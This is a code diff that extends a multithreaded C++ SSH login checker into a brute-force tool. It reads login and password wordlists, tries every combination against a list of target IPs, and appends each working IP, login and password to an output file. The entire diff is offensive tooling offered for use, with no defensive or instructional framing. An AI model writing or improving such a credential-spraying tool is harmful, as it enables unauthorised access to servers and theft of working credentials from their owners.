@@ -101,16 +101,19 @@ int main() {
     }
 
     int port;
-    string username;
-    string password;
+    string loginFile;
+    string passwordFile;
+    string outputFile;
     int threadCount;
 
     cout << "[?] SSH port: ";
     cin >> port;
-    cout << "[?] Username: ";
-    cin >> username;
-    cout << "[?] Password: ";
-    cin >> password;
+    cout << "[?] Login list file path: ";
+    cin >> loginFile;
+    cout << "[?] Password list file path: ";
+    cin >> passwordFile;
+    cout << "[?] Output file path: ";
+    cin >> outputFile;
     cout << "[?] Thread count: ";
     cin >> threadCount;
 
@@ -119,9 +122,40 @@ int main() {
         return 1;
     }
 
+    const vector<string> logins = loadTargets(loginFile);
+    const vector<string> passwords = loadTargets(passwordFile);
+
+    if (logins.empty()) {
+        cout << "[-] No logins loaded" << endl;
+        return 1;
+    }
+    if (passwords.empty()) {
+        cout << "[-] No passwords loaded" << endl;
+        return 1;
+    }
+
+    // Build all combinations: {ip, login, password}
+    struct Task {
+        string ip;
+        string login;
+        string password;
+    };
+    vector<Task> tasks;
+    tasks.reserve(targets.size() * logins.size() * passwords.size());
+    for (const auto& ip : targets)
+        for (const auto& login : logins)
+            for (const auto& pass : passwords)
+                tasks.push_back({ip, login, pass});
+
+    ofstream outFile(outputFile, ios::app);
+    if (!outFile) {
+        cerr << "[-] Can't open output file: " << outputFile << endl;
+        return 1;
+    }
+
     atomic<size_t> nextIndex(0);
     const size_t effectiveThreadCount =
-        min(static_cast<size_t>(threadCount), targets.size());
+        min(static_cast<size_t>(threadCount), tasks.size());
 
     Stats stats;
     mutex statsMutex;
@@ -132,14 +166,20 @@ int main() {
         workers.emplace_back([&]() {
             while (true) {
                 const size_t index = nextIndex.fetch_add(1);
-                if (index >= targets.size()) break;
+                if (index >= tasks.size()) break;
 
-                const bool success = authorizeSsh(targets[index], port, username, password);
+                const Task& task = tasks[index];
+                const bool success = authorizeSsh(task.ip, port, task.login, task.password);
 
                 lock_guard<mutex> lock(statsMutex);
                 stats.check++;
-                if (success) stats.valid++;
-                else stats.bad++;
+                if (success) {
+                    stats.valid++;
+                    outFile << task.ip << " " << task.login << " " << task.password << "\n";
+                    outFile.flush();
+                } else {
+                    stats.bad++;
+                }
                 printStats(stats);
             }
         });
